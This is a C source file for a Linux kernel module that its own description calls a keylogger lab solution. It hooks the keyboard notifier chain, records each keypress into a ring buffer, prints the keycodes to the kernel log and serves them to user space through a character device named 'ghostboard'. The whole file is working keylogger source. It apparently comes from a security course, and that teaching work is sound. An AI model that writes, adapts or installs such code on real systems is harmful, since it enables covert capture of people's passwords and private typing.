#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/notifier.h>
#include <linux/keyboard.h>
#include <linux/major.h>
#include <linux/cdev.h>
#include <linux/semaphore.h>
#include <linux/fs.h>
#include <linux/uaccess.h>

#include "common.h"

#define KEYBOARD_IRQ		0x01
#define I8042_STATUS_REG	0x64
#define I8042_DATA_REG		0x60
#define RING_BUFFER_SIZE	128

/* Structs and prototypes */
struct key_device {
	struct cdev cdev;
	struct semaphore sem;
	unsigned int rring_idx;
	unsigned int wring_idx;
	unsigned short ring_buf[RING_BUFFER_SIZE];
};

static ssize_t key_read(struct file* filp, char __user* buf, size_t size, loff_t* offset);
static int register_dev(void);
static int kb_notify_cb(struct notifier_block* blk, unsigned long code, void* _param);

/* Global vars */
struct key_device kdev;
static struct file_operations key_ops = {
	.owner = THIS_MODULE,
	.read = key_read,
};

static struct notifier_block kb_notify_block = {
    .notifier_call = kb_notify_cb,
};


static int __init mod_start(void) {
	int err;

	err = register_dev();
	if (err != 0) {
		return err;
	}

    err = register_keyboard_notifier(&kb_notify_block);
    if (err != 0) {
        printk(KERN_ALERT "Failed to register keyboard notifier\n");
        return -EBUSY;
    }

	return 0;
}

static void __exit mod_stop(void) {
	printk(KERN_ALERT "Goodbye, World\n");
    unregister_keyboard_notifier(&kb_notify_block);
	cdev_del(&kdev.cdev);
	unregister_chrdev_region(MKDEV(KEY_MAJ, KEY_MIN), 1);

	return;
}

int register_dev(void) {
	int err;

	err = register_chrdev_region(MKDEV(KEY_MAJ, KEY_MIN), 1, "ghostboard");
	if (err != 0) {
		printk(KERN_ALERT "Could not register region (%d,%d)\n", KEY_MAJ, KEY_MIN);
		return err;
	}

	cdev_init(&kdev.cdev, &key_ops);
	err = cdev_add(&kdev.cdev, MKDEV(KEY_MAJ, KEY_MIN), 1);
	if (err != 0) {
		printk(KERN_ALERT "Error adding char device: %d\n", err);
		return err;
	}
	kdev.wring_idx = 0;
	kdev.rring_idx = 0;
	sema_init(&kdev.sem, 0);

	return 0;
}

int kb_notify_cb(struct notifier_block* blk, unsigned long code, void* _param) {
    struct keyboard_notifier_param* param = _param;
	unsigned short keycode;
	
    if (code == KBD_KEYCODE && param->down) {
        keycode = param->value;
        if (param->shift) {
        }
    	kdev.ring_buf[kdev.wring_idx % RING_BUFFER_SIZE] = keycode;
    	printk(KERN_ALERT "Code: %04x\n", keycode);
    	kdev.wring_idx++;
    	up(&kdev.sem);
    }

    return NOTIFY_OK;
}

ssize_t key_read(struct file* filp, char __user* buf, size_t size, loff_t* offset) {
	unsigned short keycode;

	if (down_interruptible(&kdev.sem) == -EINTR) {
		return -EINTR;
	}
	keycode = kdev.ring_buf[kdev.rring_idx % RING_BUFFER_SIZE];

	if (copy_to_user((void*)buf, (void*)&keycode, sizeof(keycode)) != 0) {
		return 0;
	}
	kdev.rring_idx++;

	return sizeof(unsigned short);
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Mark O'Neill");
MODULE_DESCRIPTION("Keylogger (notifier) Lab Solution");
module_init(mod_start);
module_exit(mod_stop); 
